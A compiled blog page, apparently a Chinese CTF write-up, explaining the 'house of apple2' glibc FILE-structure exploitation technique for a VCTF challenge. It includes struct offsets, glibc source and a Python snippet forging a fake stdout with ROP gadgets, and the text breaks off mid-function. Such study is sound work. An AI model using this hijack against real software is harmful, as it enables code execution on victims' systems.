import{_ as p}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as t,o,c,a as n,b as s,d as e,e as l}from"./app-lch0_zHc.js";const i={},u=n("h1",{id:"house-of-apple2板子",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#house-of-apple2板子","aria-hidden":"true"},"#"),s(" house of apple2板子")],-1),r=n("h1",{id:"vctf-apple-复现-apple的通用模板",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#vctf-apple-复现-apple的通用模板","aria-hidden":"true"},"#"),s(" vctf apple 复现(apple的通用模板)")],-1),d={href:"https://passport.kanxue.com/user-center-964693.htm",target:"_blank",rel:"noopener noreferrer"},k=n("code",null,"_wide_data",-1),_=n("code",null,"FILE",-1),v={href:"https://bbs.kanxue.com/thread-281083.htm",target:"_blank",rel:"noopener noreferrer"},m=l(`<h2 id="条件" tabindex="-1"><a class="header-anchor" href="#条件" aria-hidden="true">#</a> 条件</h2><ul><li>泄露libc地址和堆地址</li><li>能劫持<code>stdout</code>结构体实现对<code>stdout</code>结构体的覆写</li><li>能触发puts函数</li></ul><h2 id="属性偏移" tabindex="-1"><a class="header-anchor" href="#属性偏移" aria-hidden="true">#</a> 属性偏移</h2><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token number">0x0</span><span class="token operator">:</span><span class="token char">&#39;_flags&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x8</span><span class="token operator">:</span><span class="token char">&#39;_IO_read_ptr&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x10</span><span class="token operator">:</span><span class="token char">&#39;_IO_read_end&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x18</span><span class="token operator">:</span><span class="token char">&#39;_IO_read_base&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x20</span><span class="token operator">:</span><span class="token char">&#39;_IO_write_base&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x28</span><span class="token operator">:</span><span class="token char">&#39;_IO_write_ptr&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x30</span><span class="token operator">:</span><span class="token char">&#39;_IO_write_end&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x38</span><span class="token operator">:</span><span class="token char">&#39;_IO_buf_base&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x40</span><span class="token operator">:</span><span class="token char">&#39;_IO_buf_end&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x48</span><span class="token operator">:</span><span class="token char">&#39;_IO_save_base&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x50</span><span class="token operator">:</span><span class="token char">&#39;_IO_backup_base&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x58</span><span class="token operator">:</span><span class="token char">&#39;_IO_save_end&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x60</span><span class="token operator">:</span><span class="token char">&#39;_markers&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x68</span><span class="token operator">:</span><span class="token char">&#39;_chain&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x70</span><span class="token operator">:</span><span class="token char">&#39;_fileno&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x74</span><span class="token operator">:</span><span class="token char">&#39;_flags2&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x78</span><span class="token operator">:</span><span class="token char">&#39;_old_offset&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x80</span><span class="token operator">:</span><span class="token char">&#39;_cur_column&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x82</span><span class="token operator">:</span><span class="token char">&#39;_vtable_offset&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x83</span><span class="token operator">:</span><span class="token char">&#39;_shortbuf&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x88</span><span class="token operator">:</span><span class="token char">&#39;_lock&#39;</span><span class="token punctuation">,</span>
<span class="token comment">// 以上是一个_IO_FILE结构体包含的内容</span>
<span class="token number">0x90</span><span class="token operator">:</span><span class="token char">&#39;_offset&#39;</span><span class="token punctuation">,</span>
<span class="token number">0x98</span><span class="token operator">:</span><span class="token char">&#39;_codecvt&#39;</span><span class="token punctuation">,</span>
<span class="token number">0xa0</span><span class="token operator">:</span><span class="token char">&#39;_wide_data&#39;</span><span class="token punctuation">,</span>
<span class="token number">0xa8</span><span class="token operator">:</span><span class="token char">&#39;_freeres_list&#39;</span><span class="token punctuation">,</span>
<span class="token number">0xb0</span><span class="token operator">:</span><span class="token char">&#39;_freeres_buf&#39;</span><span class="token punctuation">,</span>
<span class="token number">0xb8</span><span class="token operator">:</span><span class="token char">&#39;__pad5&#39;</span><span class="token punctuation">,</span>
<span class="token number">0xc0</span><span class="token operator">:</span><span class="token char">&#39;_mode&#39;</span><span class="token punctuation">,</span>
<span class="token number">0xc4</span><span class="token operator">:</span><span class="token char">&#39;_unused2&#39;</span><span class="token punctuation">,</span>
<span class="token comment">// 以上是 _IO_FILE_complete结构体包含的内容</span>
<span class="token number">0xd8</span><span class="token operator">:</span><span class="token char">&#39;vtable&#39;</span><span class="token punctuation">,</span>
<span class="token comment">// 以上是 _IO_FILE_plus结构体部分</span>
<span class="token number">0xe0</span><span class="token operator">:</span><span class="token char">&#39;_wide_vtable&#39;</span>
<span class="token comment">// _wide_vtable是_IO_wide_data的最后一个属性</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="各大结构体" tabindex="-1"><a class="header-anchor" href="#各大结构体" aria-hidden="true">#</a> 各大结构体</h2><blockquote><p>建议和上面的偏移结合起来看 还是比较详细的</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>       <span class="token comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>
 
  <span class="token comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>   <span class="token comment">/* Current read pointer */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>   <span class="token comment">/* End of get area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>  <span class="token comment">/* Start of putback+get area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span> <span class="token comment">/* Start of put area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>  <span class="token comment">/* Current put pointer. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>  <span class="token comment">/* End of put area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>   <span class="token comment">/* Start of reserve area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>    <span class="token comment">/* End of reserve area. */</span>
 
  <span class="token comment">/* The following fields are used to support backing up and undo. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment">/* Pointer to start of non-current get area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment">/* Pointer to first valid character of backup area */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment">/* Pointer to end of non-current get area. */</span>
 
  <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>
 
  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span>
 
  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
  __off_t _old_offset<span class="token punctuation">;</span> <span class="token comment">/* This used to be _offset but it&#39;s too small.  */</span>
 
  <span class="token comment">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_USE_OLD_IO_FILE</span></span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span>
<span class="token punctuation">{</span>
  FILE file<span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
 
<span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_complete</span>
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> _file<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
  __off64_t _offset<span class="token punctuation">;</span>
  <span class="token comment">/* Wide character stream stuff.  */</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_codecvt</span> <span class="token operator">*</span>_codecvt<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span>_wide_data<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_freeres_list<span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>_freeres_buf<span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> __pad5<span class="token punctuation">;</span>
  <span class="token keyword">int</span> _mode<span class="token punctuation">;</span>
  <span class="token comment">/* Make sure we don&#39;t get into trouble again.  */</span>
  <span class="token keyword">char</span> _unused2<span class="token punctuation">[</span><span class="token number">15</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_complete_plus</span>
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_complete</span> file<span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="exp中伪造" tabindex="-1"><a class="header-anchor" href="#exp中伪造" aria-hidden="true">#</a> exp中伪造</h2><blockquote><p>先这里给出exp中伪造的<code>stdout</code>结构体 方便我们后面分析</p></blockquote><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>FILE <span class="token operator">=</span> IO_FILE_plus_struct<span class="token punctuation">(</span><span class="token punctuation">)</span>
FILE<span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token number">0</span>
FILE<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> pop_rbp
FILE<span class="token punctuation">.</span>_IO_read_end <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x470</span> <span class="token operator">-</span> <span class="token number">8</span>
FILE<span class="token punctuation">.</span>_IO_read_base <span class="token operator">=</span> leave_ret
FILE<span class="token punctuation">.</span>_IO_write_base <span class="token operator">=</span> <span class="token number">0</span>
FILE<span class="token punctuation">.</span>_IO_write_ptr <span class="token operator">=</span> <span class="token number">1</span>
FILE<span class="token punctuation">.</span>_lock <span class="token operator">=</span> heap_addr <span class="token operator">-</span> <span class="token number">0xc30</span>
FILE<span class="token punctuation">.</span>chain <span class="token operator">=</span> leave_ret
FILE<span class="token punctuation">.</span>_codecvt <span class="token operator">=</span> stdout_addr
FILE<span class="token punctuation">.</span>_wide_data <span class="token operator">=</span> stdout_addr <span class="token operator">-</span> <span class="token number">0x48</span>
FILE<span class="token punctuation">.</span>vtable <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#39;_IO_wfile_jumps&#39;</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base <span class="token operator">-</span> <span class="token number">0x20</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="动调" tabindex="-1"><a class="header-anchor" href="#动调" aria-hidden="true">#</a> 动调</h2><p>目的:通过puts函数触发<code>_IO_wfile_overflow</code>函数来调用<code>_IO_wdoallocbuf</code>函数</p><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_SBNZYCD5P9CM2F7.jpg" alt="image-20240515214202580" tabindex="0" loading="lazy"><figcaption>image-20240515214202580</figcaption></figure><h3 id="正常的调用链" tabindex="-1"><a class="header-anchor" href="#正常的调用链" aria-hidden="true">#</a> 正常的调用链</h3><blockquote><p>为了搞清楚劫持原理 这里我们分析puts函数的源码</p></blockquote><ul><li><p>puts中调用<code>_IO_file_xsputn</code>（stdout-&gt;vatble(0xd8)-&gt;_IO_file_xsputn(0x38)）</p><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_7PEGY8VD8FSQG5W.jpg" alt="image-20240516010449032" tabindex="0" loading="lazy"><figcaption>image-20240516010449032</figcaption></figure><ul><li><p><code>r14</code>此时为 也就是_IO_file_jumps+0x38的位置</p><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_N5QH9E59H36Z3XM.jpg" alt="image-20240516012651838" tabindex="0" loading="lazy"><figcaption>image-20240516012651838</figcaption></figure></li><li><p>而<code>r14</code>是通过<code>mov r14, [rdi+0D8h]</code>取出来的 rdi为<code>_IO_2_1_stdout_</code> 根据<code>0xd8</code>偏移可以知道是<code>vatble</code>属性</p><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_F5AX6WA69QQQF2J.jpg" alt="image-20240516012935973" tabindex="0" loading="lazy"><figcaption>image-20240516012935973</figcaption></figure></li></ul></li><li><p>然后调用<code>_IO_file_overflow</code></p><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_PRKKB48UHJUUX3X.jpg" alt="image-20240516010742819" tabindex="0" loading="lazy"><figcaption>image-20240516010742819</figcaption></figure></li><li><p>然后走向<code>_IO_do_write</code></p><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_T2NCRVTYE44VC4H.jpg" alt="image-20240516010911530" tabindex="0" loading="lazy"><figcaption>image-20240516010911530</figcaption></figure></li></ul><h3 id="io-wfile-jumps结构体" tabindex="-1"><a class="header-anchor" href="#io-wfile-jumps结构体" aria-hidden="true">#</a> _IO_wfile_jumps结构体</h3><blockquote><p>所以要调用<code>_IO_wfile_overflow</code>则需要vatble+0x38位置为<code>_IO_wfile_jumps</code>+24 所以这里控制vtable为<code>_IO_wfile_jumps</code>-0x20</p></blockquote><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_PJBFJ6DHAGHDPBB.jpg" alt="image-20240516013411102" tabindex="0" loading="lazy"><figcaption>image-20240516013411102</figcaption></figure><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span>
<span class="token punctuation">{</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_finish_t<span class="token punctuation">,</span> __finish<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">,</span> __overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __underflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __uflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">,</span> __pbackfail<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* showmany */</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsgetn_t<span class="token punctuation">,</span> __xsgetn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekoff_t<span class="token punctuation">,</span> __seekoff<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekpos_t<span class="token punctuation">,</span> __seekpos<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">,</span> __setbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">,</span> __sync<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_doallocate_t<span class="token punctuation">,</span> __doallocate<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_read_t<span class="token punctuation">,</span> __read<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_write_t<span class="token punctuation">,</span> __write<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seek_t<span class="token punctuation">,</span> __seek<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_close_t<span class="token punctuation">,</span> __close<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_stat_t<span class="token punctuation">,</span> __stat<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_showmanyc_t<span class="token punctuation">,</span> __showmanyc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_imbue_t<span class="token punctuation">,</span> __imbue<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="io-wfile-overflow函数" tabindex="-1"><a class="header-anchor" href="#io-wfile-overflow函数" aria-hidden="true">#</a> <code>_IO_wfile_overflow</code>函数</h3><blockquote><p>我们最终是想要调用<code>_IO_wdoallocbuf</code>函数</p></blockquote><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token class-name">wint_t</span>
<span class="token function">_IO_wfile_overflow</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token class-name">wint_t</span> wch<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span> <span class="token comment">/* SET ERROR */</span>
    <span class="token punctuation">{</span>
      f<span class="token operator">-&gt;</span>_flags <span class="token operator">|=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>
      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> WEOF<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token comment">/* If currently reading or no buffer allocated. */</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token comment">/* Allocate a buffer if needed. */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">_IO_wdoallocbuf</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">_IO_free_wbackup_area</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">_IO_wsetg</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span>
             f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">_IO_setg</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">,</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      <span class="token comment">/* Otherwise must be currently reading.  If _IO_read_ptr
         (and hence also _IO_read_end) is at the buffer end,
         logically slide the buffer forwards one block (by setting
         the read pointers to all point at the beginning of the
         block).  This makes room for subsequent output.
         Otherwise, set the read pointers to _IO_read_end (leaving
         that alone, so it can continue to correspond to the
         external position). */</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">==</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          f<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
          f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span>
        f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
      f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span>
    f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">;</span>
 
      f<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">;</span>
      f<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_IO_read_end<span class="token punctuation">;</span>
 
      f<span class="token operator">-&gt;</span>_flags <span class="token operator">|=</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF <span class="token operator">|</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>
    f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>wch <span class="token operator">==</span> WEOF<span class="token punctuation">)</span>
